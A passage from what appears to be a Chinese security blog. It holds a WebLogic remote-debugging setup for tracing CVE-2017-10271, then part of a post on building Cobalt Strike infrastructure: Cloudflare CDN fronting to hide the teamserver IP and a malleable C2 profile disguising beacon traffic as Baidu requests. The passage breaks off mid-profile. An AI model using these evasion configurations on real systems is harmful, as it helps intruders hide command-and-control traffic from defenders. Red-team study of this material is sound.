                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        最近一直在做一些项目，因为对一些原理性的知识不懂感觉渗透很难再继续往上走，因此接下来打算将精力放在漏洞的理解和分析，工具的编写和优化上面，而不再执着于更多的技巧。</p>
<p>​        weblogic是一款比较经常使用的java容器，当然它爆出的漏洞也是层出不穷，为了能让自己更加了解weblogic漏洞的形成原因，我决定和大家一起调试weblogic各个版本的一些漏洞，并最终编写一个简单的weblogic漏洞检测工具，在这片文章中，我们首先一起来学习一下如何搭建weblogic的调试环境。</p>
<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>​        首先，在官网下载weblogic的安装包，双击进行安装</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210608351.png" alt="image-20201030210608351"></p>
<p>​        安装好以后，创建weblogic域</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210658376.png" alt="image-20201030210658376"></p>
<p>​        安装成功后，在domains下的bin目录下有个startWebLogic.cmd文件</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210904700.png" alt="image-20201030210904700"></p>
<p>​        编辑startWebLogic.cmd文件，在文件的开头加上如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set JAVA_OPTIONS&#x3D;-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,address&#x3D;9999,server&#x3D;y,suspend&#x3D;n</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030204516719.png" alt="image-20201030204516719"></p>
<p>​        双击startWebLogic.cmd启动weblogic,可以看到已经开启了9999端口的监听</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210943558.png" alt="image-20201030210943558"></p>
<p>​        同时使用netstat查看，也可以看到9999端口的监听</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211009015.png" alt="image-20201030211009015"></p>
<p>​        打开idea,import wlserver_10.3这个目录</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211258783.png" alt="image-20201030211258783"></p>
<p>​        在server/lib目录上选择add as library</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211344142.png" alt="image-20201030211344142"></p>
<p>​        选择调试配置</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211447373.png" alt="image-20201030211447373"></p>
<p>​        添加一个remote的配置</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230633634.png" alt="image-20201030230633634"></p>
<p>端口选择9999端口</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230709499.png" alt="image-20201030230709499"></p>
<p>​        我们再点击debug，如果成功则会出现Connected to the target VM, address: ‘127.0.0.1:9999’, transport: ‘socket’，没成功的话可以重新运行startWebLogic.cmd文件再去debug。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230745586.png" alt="image-20201030230745586"></p>
<p>​        为了测试能否下断点，我们首先测试一下CVE-2017-10271这个漏洞，再漏洞的返回包中查看调用链，这里可以看到调用了weblogic.wsee.workarea.WorkContextXmlInputAdapter类的readUTF方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230958127.png" alt="image-20201030230958127"></p>
<p>​        我们找到readUTF方法并下断点，查看能否断住，我这里可以成功下到断点，至此，weblogic的调试环境搭建成功。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030231147688.png" alt="image-20201030231147688"></p>
<h2 id="JDK内置函数无法继续跟踪"><a href="#JDK内置函数无法继续跟踪" class="headerlink" title="JDK内置函数无法继续跟踪"></a>JDK内置函数无法继续跟踪</h2><p>​        在调试过程中，发现当调用xlDecoder.readObject()函数时，无法继续深入跟踪，在idea的顶部也有一个报错。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031095622944.png" alt="image-20201031095622944"></p>
<p>​        经过分析weblogic默认使用自带的jdk6来编译运行，而我使用的是jdk8,因此需要改变jdk的版本。选择 <code>Project Structure</code>，在project中new一个jdk，选择weblogic自带的jdk，如下如图所示：</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031100649371.png" alt="image-20201031100649371"></p>
<p>​        修改以后即可跟踪到readObject这个函数的执行过程</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031101247175.png" alt="image-20201031101247175"></p>
<p><strong>参考文章</strong></p>
<p><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">WebLogic-动态调试环境搭建</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/" class="post-title-link" itemprop="url">记基于cobaltstrike基础设施架构设计尝试</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-08 11:11:22" itemprop="dateCreated datePublished" datetime="2020-09-08T11:11:22+08:00">2020-09-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-10-12 10:59:14" itemprop="dateModified" datetime="2020-10-12T10:59:14+08:00">2020-10-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过之前的介绍我们了解了cobaltstrike的一些混淆或者隐藏的策略，这次我们主要对学到的这些策略进行实践，设计一个比较好用的不容易被反查的方案。</p>
<p>​        设计思路如下：</p>
<ul>
<li><p>自定义mallable c2 profile文件，自定义通讯流量</p>
</li>
<li><p>前置机通过mod_rewrite对不同流量进行不同的转发</p>
</li>
<li><p>给前置机配置CDN保护前置机的真实IP</p>
</li>
<li><p>teamserver主机配置防火墙仅允许前置机和teamserver主机的特定端口通信</p>
<p>因为CDN配置需要等待一段时间才能生效，所以我们先来配置CDN。</p>
</li>
</ul>
<h3 id="cloudflare配置免费CDN"><a href="#cloudflare配置免费CDN" class="headerlink" title="cloudflare配置免费CDN"></a>cloudflare配置免费CDN</h3><p>​        在<a href="https://dash.cloudflare.com/login" target="_blank" rel="noopener">cloudflare</a>提供了免费的CDN,我们可以申请一个账号，登录后首先选择添加站点</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908113445450.png" alt="image-20200908113445450"></p>
<p>​            选择add a site添加我们想要配置CDN的域名后，选择free也就是免费的CND，确定后会来到如下界面，选择continue</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114452692.png" alt="image-20200908114452692"></p>
<p>​        然后需要我们去我们自己的域名控制台去修改记录。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114648182.png" alt="image-20200908114648182"></p>
<p>​        我这里的域名是在腾讯云注册的，因此我来到腾讯云的控制台来修改</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114925213.png" alt="image-20200908114925213"></p>
<p>​        找到注册商这里点击管理</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115122093.png" alt="image-20200908115122093"></p>
<p>​        对DNS服务器进行修改，修改为cloudflare</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115215847.png" alt="image-20200908115215847"></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115641139.png" alt="image-20200908115641139"></p>
<p>​        将NS记录也做一下修改</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120045948.png" alt="image-20200908120045948"></p>
<p>​        设置好以后我们来到cloudflare，选择确认后会有一些配置，全选择默认就好了。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120217855.png" alt="image-20200908120217855"></p>
<p>​        配置好以后刚开是域名可能还是下面的状态</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120401476.png" alt="image-20200908120401476"></p>
<p>​        点击域名后往下拉，有个re-check的按钮，可以通过这个来检测配置是否生效，这个需要一段时间才可以生效。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120439002.png" alt="image-20200908120439002"></p>
<p>​        稍微等待一会以后，再去查看域名，发现状态变成了active，这说明配置的解析已经生效了</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121034826.png" alt="image-20200908121034826"></p>
<p>​        进入域名以后，我们可以看到这里已经提示配置成功了，我们再去选择DNS对解析记录进行修改</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121124053.png" alt="image-20200908121124053"></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121316626.png" alt="image-20200908121316626"></p>
<p>​        配置好以后我们再去ping我们的域名可以看到得到的IP是cloudflare节点的IP</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121455393.png" alt="image-20200908121455393"></p>
<h3 id="自定义Mallable-C2-流量"><a href="#自定义Mallable-C2-流量" class="headerlink" title="自定义Mallable C2 流量"></a>自定义Mallable C2 流量</h3><p>​        之前我们了解过关于Mallable C2 profile文件的编写，今天我们尝试着去编写一个profile文件，因为百度在国内用的也比较多，所以我将尝试以百度为例来进行流量混淆。</p>
<p>​        首先是一些是一些基本的配置信息，这些配置和流量本身没有太大关系，所以可以先配置这部分的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  &#x2F;&#x2F;延时5秒左右</span><br><span class="line">set jitter    &quot;30&quot;;   &#x2F;&#x2F;配置延时的波动百分比，我们这里也控制在百分之30</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;user-agent配置</span><br><span class="line"></span><br><span class="line">###SMB options###    &#x2F;&#x2F;smb 命名管道名称的配置</span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;nbtsvcs&quot;;</span><br></pre></td></tr></table></figure>

<p>​        下来我们要配置一些和百度有关的流量部分的配置,因为我们设置profile文件的目的就是使我们的通信流量模拟百度的通信流量，因此我们首先要分析百度的流量，从中选择比较合适的流量。首先我们先来看下访问百度网站时的请求头的流量。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144452608.png" alt="image-20200908144452608"></p>
<p>​        我们根据百度的请求头来编写我们配置GET请求部分，下面这部分是客户端和teamserver服务端获取执行命令时的url的配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;no-cors&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29A3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1591203863; BAIDUID&#x3D;7B3B91054F6B7A69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; H_PS_645EC&#x3D;bc01FRkCkZHub5%2Fa5TNP%2Bnfm1rK01EMDjcigAfzJf0hSG5tXtJ5cc%2Fug9m4w3cQnMZxL; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​        配置好请求包后我们还要配置返回包,返回包原始内容如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144621899.png" alt="image-20200908144621899"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   server &#123;</span><br><span class="line"></span><br><span class="line">header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">       output &#123;</span><br><span class="line">           netbios;</span><br><span class="line">           prepend &quot;                 &quot;;</span><br><span class="line">   		prepend &quot;GIF89a&quot;;</span><br><span class="line">   		append &quot;;&quot;;</span><br><span class="line">           print;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再来配置一下http-post，这个主要是用来客户端给服务端返回命令执行的结果。首先我们先要选择一个适合伪装流量的请求，这个流量需要去向服务端发送大量的信息，但是返回信息却不用很多，经过查看发现百度大部分是请求时get请求，有一个请求会发送一个加密的url信息，所以我尝试通过伪造这个url来获取客户端的返回信息。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908150138010.png" alt="image-20200908150138010"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">       </span><br><span class="line">		header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;%E5%8D%B0%E5%BA%A6%E5%A4%96%E9%95%BF%E5%86%8D%E8%B0%88%E4%B8%AD%E5%8D%B0%E8%BE%B9%E5%A2%83%E7%B4%A7%E5%BC%A0%E5%B1%80%E5%8A%BF&amp;rsv_idx&#x3D;2&amp;tn&#x3D;baiduhome_pg&amp;usm&#x3D;2&amp;ie&#x3D;utf-8&amp;rsv_cq&#x3D;&amp;rsv_dl&#x3D;0_right_fyb_pchot_20811_01&amp;rsf&#x3D;392deae71492ecf08ccf48e0d95afc29_1_15_1&amp;rqid&#x3D;d04f8f9d00035648&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; 